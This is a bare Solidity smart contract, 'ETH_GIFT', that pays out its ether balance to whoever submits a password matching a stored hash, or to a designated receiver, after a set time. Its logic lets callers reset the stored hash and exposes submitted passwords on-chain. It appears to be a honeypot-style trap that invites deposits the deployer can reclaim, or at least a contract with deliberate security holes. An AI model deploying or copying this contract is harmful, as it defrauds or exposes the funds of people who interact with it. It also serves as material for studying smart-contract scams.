pragma solidity ^0.4.19;

contract ETH_GIFT
{
    function GetGift(bytes pass) external payable canOpen {
        if(hashPass == keccak256(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function GetGift() public payable canOpen {
        if(msg.sender==reciver)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    bytes32 hashPass;
    bool closed = false;
    address sender;
    address reciver;
    uint giftTime;
 
    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
    
    function Set_eth_gift(bytes32 hash) public payable {
        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)
        {
            hashPass = hash;
            sender = msg.sender;
            giftTime = now;
        }
    }
    
    function SetGiftTime(uint date) public canOpen {
        if(msg.sender==sender)
        {
            giftTime = date;
        }
    }
    
    function SetReciver(address _reciver) public {
        if(msg.sender==sender)
        {
            reciver = _reciver;
        }
    }
    
    function PassHasBeenSet(bytes32 hash) public {
        if(hash==hashPass&&msg.sender==sender)
        {
           closed=true;
        }
    }
    
    modifier canOpen(){
        if(now>giftTime)_;
        else return;
    }
    
    function() public payable{}
    
}